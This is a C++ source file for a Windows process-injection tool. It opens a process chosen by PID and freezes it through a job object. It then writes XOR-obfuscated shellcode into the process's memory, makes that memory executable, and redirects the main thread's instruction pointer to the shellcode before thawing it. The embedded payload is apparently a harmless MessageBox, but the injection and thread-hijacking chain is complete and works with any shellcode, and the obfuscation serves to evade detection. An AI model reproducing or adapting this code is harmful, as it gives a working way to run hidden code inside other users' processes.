#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <thread>
#include <chrono>
#include <TlHelp32.h>

#define XOR_KEY 0xAA

void decrypt(unsigned char* code, int size) {
    for (int i = 0; i < size; i++) {
        code[i] ^= XOR_KEY;
    }
}


void SetColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE); 
    SetConsoleTextAttribute(hConsole, color);         
}

#define JobObjectFreezeInformation 18

// Definition von JOBOBJECT_WAKE_FILTER
typedef struct _JOBOBJECT_WAKE_FILTER
{
    ULONG HighEdgeFilter;
    ULONG LowEdgeFilter;
} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;

// Definition von JOBOBJECT_FREEZE_INFORMATION
typedef struct _JOBOBJECT_FREEZE_INFORMATION
{
    union
    {
        ULONG Flags;
        struct
        {
            ULONG FreezeOperation : 1;
            ULONG FilterOperation : 1;
            ULONG SwapOperation : 1;
            ULONG Reserved : 29;
        };
    };
    BOOLEAN Freeze;
    BOOLEAN Swap;
    UCHAR Reserved0[2];
    JOBOBJECT_WAKE_FILTER WakeFilter;
} JOBOBJECT_FREEZE_INFORMATION, * PJOBOBJECT_FREEZE_INFORMATION;


HANDLE globalJobHandle = NULL;

bool FreezeProcess(HANDLE hProcess)
{
    globalJobHandle = CreateJobObject(NULL, NULL);
    if (!globalJobHandle)
    {
        std::cerr << "Failed to create Job Object. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (!AssignProcessToJobObject(globalJobHandle, hProcess))
    {
        std::cerr << "Failed to assign process to Job Object. Error: " << GetLastError() << std::endl;
        CloseHandle(globalJobHandle);
        globalJobHandle = NULL;
        return false;
    }

    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
    freezeInfo.FreezeOperation = 1; // Initiate freeze
    freezeInfo.Freeze = TRUE;

    if (!SetInformationJobObject(
        globalJobHandle,
        (JOBOBJECTINFOCLASS)JobObjectFreezeInformation,
        &freezeInfo,
        sizeof(freezeInfo)))
    {
        std::cerr << "Failed to freeze Job Object. Error: " << GetLastError() << std::endl;
        CloseHandle(globalJobHandle);
        globalJobHandle = NULL;
        return false;
    }

    //std::cout << "Process frozen successfully!" << std::endl;
    return true;
}

bool ThawProcess(HANDLE hProcess)
{
    if (!globalJobHandle)
    {
        std::cerr << "No valid job handle available for thawing. Did you freeze the process first?" << std::endl;
        return false;
    }

    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
    freezeInfo.FreezeOperation = 1; // Unfreeze operation
    freezeInfo.Freeze = FALSE;

    if (!SetInformationJobObject(
        globalJobHandle,
        (JOBOBJECTINFOCLASS)JobObjectFreezeInformation,
        &freezeInfo,
        sizeof(freezeInfo)))
    {
        std::cerr << "Failed to thaw Job Object. Error: " << GetLastError() << std::endl;
        return false;
    }

    std::cout << "Process thawed successfully!" << std::endl;
    return true;
}


// Function for finding the main thread of the process
DWORD GetMainThreadId(DWORD processId) {
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    DWORD mainThreadId = 0;
    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                mainThreadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);
    return mainThreadId;
}


int main()
{
    DWORD pid;

    // MessageBox with some nops and XOR encryption
    unsigned char myCode[] = { 0x3a, 0x3a, 0x3a, 0x56, 0xe2, 0x2b, 0x4e, 0x5a, 0x55, 0x55, 0x55, 0x42, 0x7a, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0x94, 0xe2, 0x21, 0xf8, 0xb2, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0xe2, 0x21, 0xd8, 0xfa, 0x94, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0x94, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xc5, 0xe2, 0xab, 0x7a, 0xfa, 0x94, 0x21, 0xe2, 0xb2, 0x94, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xf6, 0xe2, 0x55, 0x63, 0x94, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0x94, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x7c, 0xf2, 0x94, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0x94, 0xeb, 0x21, 0xa6, 0xe2, 0x94, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0x94, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0x94, 0xe2, 0x21, 0xb8, 0x43, 0xe3, 0x55, 0x55, 0x55, 0xf7, 0x94, 0xe2, 0x27, 0x27, 0xb0, 0xab, 0xaa, 0xaa, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xe3, 0x6d, 0x6b, 0xaa, 0xaa, 0xaa, 0xaa, 0x94, 0xe2, 0x27, 0x3f, 0xa4, 0xab, 0xaa, 0xaa, 0x94, 0xe6, 0x27, 0x2f, 0xbe, 0xab, 0xaa, 0xaa, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0xef, 0x29, 0xfc, 0xad, 0x55, 0x7f, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0x5a, 0x1f, 0x08, 0xfc, 0x55, 0x7f, 0xc2, 0xcf, 0xc6, 0xc6, 0xc5, 0xaa, 0xc2, 0xcf, 0xc6, 0xc6, 0xc5, 0xaa, 0xdf, 0xd9, 0xcf, 0xd8, 0x99, 0x98, 0x84, 0xce, 0xc6, 0xc6, 0xaa };

    int charArrayLen = sizeof(myCode);

    SetColor(FOREGROUND_GREEN);
    printf("[+] Please enter the PID of the target Process: \n");
    scanf("%d", &pid);


    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hProcess == NULL) {
        SetColor(FOREGROUND_RED);
        printf("[-] Failed to open Process PID %d\n", pid);
        printf("[i] Error Code: %d", GetLastError());
    }
    else {
       
        // Prozess einfrieren
        if (FreezeProcess(hProcess))
        {
            SetColor(FOREGROUND_BLUE);
            std::cout << "Process will be freezed" << std::endl;

            LPVOID hVirtualAlloc = VirtualAllocEx(hProcess, NULL, charArrayLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (hVirtualAlloc == NULL) {
                SetColor(FOREGROUND_RED);
                printf("[-] Error Code: %d\n", GetLastError());
                return -1;
            }

            decrypt(myCode, charArrayLen);

            if (WriteProcessMemory(hProcess, hVirtualAlloc, myCode, charArrayLen, NULL)) {
                SetColor(FOREGROUND_GREEN);
                printf("[+] Shellcode was copied to 0x%p\n", hVirtualAlloc);
            }

            
            DWORD oldProtect = 0;
            if (VirtualProtectEx(hProcess, hVirtualAlloc, charArrayLen, PAGE_EXECUTE_READ, &oldProtect)) {
                printf("[+] Protection Level set on EXECUTE_READ\n");
            }
            else {
                return -1;
            }

            // Identification main thread 
            DWORD mainThreadId = GetMainThreadId(pid);
            if (!mainThreadId) {
                SetColor(FOREGROUND_RED);
                printf("[-] Failed to find main thread ID.\n");
                return -1;
            }

            // Open main thread
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, mainThreadId);
            if (!hThread) {
                printf("[-] Failed to open main thread. Error: %d\n", GetLastError());
                return -1;
            }

            // Set the context
            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_CONTROL;
            if (GetThreadContext(hThread, &ctx)) {
#ifdef _WIN64
                ctx.Rip = (DWORD64)hVirtualAlloc;
#else
                ctx.Eip = (DWORD)hVirtualAlloc;
#endif

                if (!SetThreadContext(hThread, &ctx)) {
                    printf("[-] Failed to set thread context. Error: %d\n", GetLastError());
                    ResumeThread(hThread);
                    CloseHandle(hThread);
                    return -1;
                }
                SetColor(FOREGROUND_GREEN);
                printf("[+] Thread context successfully modified to point to shellcode at 0x%p.\n", hVirtualAlloc);
            }
            else {
                SetColor(FOREGROUND_RED);
                printf("[-] Failed to get thread context. Error: %d\n", GetLastError());
                CloseHandle(hThread);
                return -1;
            }

            // Countdown of 7 seconds 
            for (int i = 7; i > 0; --i)
            {
                SetColor(FOREGROUND_BLUE);
                std::cout << "Thawing in " << i << " seconds..." << std::endl;
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }

            // Thawing process
            if (!ThawProcess(hProcess))
            {
                SetColor(FOREGROUND_RED);
                std::cerr << "Failed to thaw the process." << std::endl;
            }

            if (globalJobHandle)
            {
                CloseHandle(globalJobHandle);
                globalJobHandle = NULL;

            } else {
                SetColor(FOREGROUND_RED);
                printf("[-] Error Code: %d", GetLastError());
                return -1;
            }

            if (hThread != NULL) {
                WaitForSingleObject(hThread, 20); // Waiting for Thread to finish
            }
            else {
                SetColor(FOREGROUND_RED);
                printf("[-] Error creating Thread -> Error Code: %d\n", GetLastError());
            }

            /*if (!PostThreadMessage(mainThreadId, WM_NULL, 0, 0)) {
                // May fail if the thread does not have a message queue, or if it is called too early.
                SetColor(FOREGROUND_RED);
                std::cerr << "PostThreadMessage failed. Failure Code: " << GetLastError() << std::endl;
            }
            else {
                SetColor(FOREGROUND_GREEN);
                std::cout << "Dummy-Message (WM_NULL) to ThreadID " << mainThreadId << " send.\n";
            }*/
            
            CloseHandle(hThread);
            CloseHandle(hProcess);
            getchar();
            VirtualFree(hVirtualAlloc, 0, MEM_RELEASE);
        }
    }
}
